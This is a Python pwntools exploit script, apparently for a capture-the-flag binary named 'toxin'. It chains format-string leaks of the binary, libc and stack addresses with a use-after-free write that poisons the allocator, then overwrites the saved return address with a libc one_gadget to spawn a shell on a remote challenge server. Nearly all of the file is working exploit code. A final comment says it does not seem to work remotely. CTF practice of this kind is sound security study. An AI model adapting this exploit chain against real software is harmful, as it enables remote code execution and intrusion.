#!/usr/bin/python3

from pwn import *

exe = ELF("toxin_patched", checksec=False)
libc = ELF("./lib/libc.so.6", checksec=False)
ld = ELF("./lib/ld-2.27.so", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "INFO"
isDebug = False

gs = '''
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def sleepFor(x = 0.1):
	sleep(x)


# *****************************************************************************************#
# Exploit functions
# *****************************************************************************************#


def bypass_pie():
    info("Leaking binary...")
    io.sendline(b"4")
    sleepFor()
    io.recvuntil(b"term: ")
    io.send(b"%20$p")
    sleepFor()
    output = io.recvS()
    info(f"{(output)=}")
    binary_leak_int = int(output.split(" ")[0], 16)
    exe.address = binary_leak_int - 0x000010d0
    info(f"{hex(exe.address)=}")

def bypass_aslr():
    info("Leaking libc...")
    io.sendline(b"4")
    sleepFor()
    io.recvuntil(b"term: ")
    io.send(b"%3$p")
    sleepFor()
    output = io.recvS()
    info(f"{(output)=}")
    libc_leak_int = int(output.split(" ")[0], 16)

    # we leak __GI___read+17
    # readelf:  3329: 0000000000110070   153 FUNC    LOCAL  DEFAULT   13 __GI___read
    # so to get libc base we take the leak, normalize it by substracting 17 bytes and then we subtract the offset in libc for this function
    libc.address = libc_leak_int - 17 - 0x0000000000110070
    info(f"{hex(libc.address)=}")

def leak_saved_rip_from_stack() -> int:
    info("Leaking rip...")
    io.sendline(b"4")
    sleepFor()
    io.recvuntil(b"term: ")
    io.sendline(b"%1$p")
    sleepFor()
    output = io.recvS()
    rip_leak_int = int(output.split("\n")[0], 16)
    
    # from gdb we can see the leaked stack address is 0xe bytes before the stack address that holds the address of the saved rip (this is
    # the next memory address after the call to menu() function)
    # by overwriting that address with the address of one_gadget we might be able to get a working exploit once the function returns
    return_rip = rip_leak_int + 0xe 
    info(f"{hex(return_rip)=}")
    return return_rip

def add_toxin(idx, payload):
    info(f"Adding toxin .. {idx}")
    io.sendline(b"1")
    sleepFor()
    io.recvuntil(b"length: ")
    io.sendline(f"{int(0x68)}".encode())
    sleepFor()
    io.recvuntil(b"index: ")
    io.sendline(f"{idx}".encode())
    sleepFor()
    io.recvuntil(b"formula: ")
    io.sendline(payload)
    sleepFor()

def drink_toxin(idx):
    info(f"Drinking toxin .. {idx}")
    io.sendline(b"3")
    sleepFor()
    io.recvuntil(b"> ")
    io.sendline(f"{idx}".encode())
    sleepFor()

def edit_toxin(idx, payload):
    info(f"Edit toxin .. {idx}")
    io.sendline(b"2")
    sleepFor()
    io.recvuntil(b"index: ")
    io.sendline(f"{idx}".encode())
    sleepFor()
    io.recvuntil(b"formula: ")
    io.send(payload)
    sleepFor()

#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
#ip_offset = find_ip_offset(cyclic(200))
#ip_offset = 56
# io = start_local(isDebug)

######## REMOTE ########
io = remote("206.189.23.108", 32698)

bypass_pie()
bypass_aslr()
saved_rip = leak_saved_rip_from_stack()

add_toxin(0, b"AAAA")
drink_toxin(0)
edit_toxin(0, p64(saved_rip))

one_gadget1 = 0x4f2c5
one_gadget2 = 0x4f322
one_gadget3 = 0x10a38c

add_toxin(1, b"CCCC")

info(f"{hex(libc.address + one_gadget2)=}")
add_toxin(2, p64(libc.address + one_gadget2))

io.interactive()


# in this one I used a different approach where I can get the 
# address of the saved rip. This is the address the function will return
# to once menu() is done. So if we can overwrite whats in that address and point
# to a one_gadget for instance, once menu() returns, it will execute
# the one_gadget, giving us a shell.
# This also, does not appear to work remotly. 